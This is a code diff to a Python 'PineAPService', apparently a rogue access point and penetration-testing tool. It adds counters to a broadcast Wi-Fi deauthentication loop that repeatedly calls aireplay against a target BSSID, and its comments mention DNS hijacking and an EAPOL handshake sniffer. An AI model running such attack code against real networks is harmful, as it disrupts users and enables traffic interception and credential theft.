@@ -254,6 +254,11 @@ class PineAPService:
             # Runtime flag — True while the direct open-portal path's
             # standalone broadcast-deauth loop is running.
             "direct_deauth_running": False,
+            # Live burst count + target for the direct deauth loop, surfaced
+            # in the EAPOL Sniffer section (the direct path doesn't run the
+            # evil_wpa sniffer, so its own deauth counters stay zero).
+            "direct_deauth_bursts": 0,
+            "direct_deauth_bssid": None,
             # Whether the rogue dnsmasq is currently in DNS-hijack mode
             # (captive portal). Tracked so the bait-switch knows it doesn't
             # need a mid-flight dnsmasq restart.
@@ -1665,6 +1670,8 @@ class PineAPService:
         t.start()
         with self._lock:
             self._state["direct_deauth_running"] = True
+            self._state["direct_deauth_bursts"] = 0
+            self._state["direct_deauth_bssid"] = bssid
             self._save_state()
         mfp = " (target advertises MFP-required — frames will be rejected)" \
             if ap.get("mfp_required") else ""
@@ -1689,11 +1696,23 @@ class PineAPService:
         # Brief settle so the radio is on-channel before the first burst.
         self._direct_deauth_stop.wait(2.0)
         while not self._direct_deauth_stop.is_set():
+            fired = False
             if not stub_mode():
                 try:
-                    aireplay.send_deauth(iface, bssid, client_mac=None, count=8)
+                    ok, _ = aireplay.send_deauth(iface, bssid,
+                                                 client_mac=None, count=8)
+                    fired = bool(ok)
                 except Exception:
                     log.exception("pineap: direct deauth burst failed")
+            else:
+                fired = True  # stub: count so the UI shows activity
+            if fired:
+                # In-memory bump so the EAPOL Sniffer section reflects it on
+                # its next poll (no disk write per burst).
+                with self._lock:
+                    if self._state is not None:
+                        self._state["direct_deauth_bursts"] = \
+                            int(self._state.get("direct_deauth_bursts") or 0) + 1
             self._direct_deauth_stop.wait(5.0)
         log.info("pineap: direct deauth loop stopped")
 
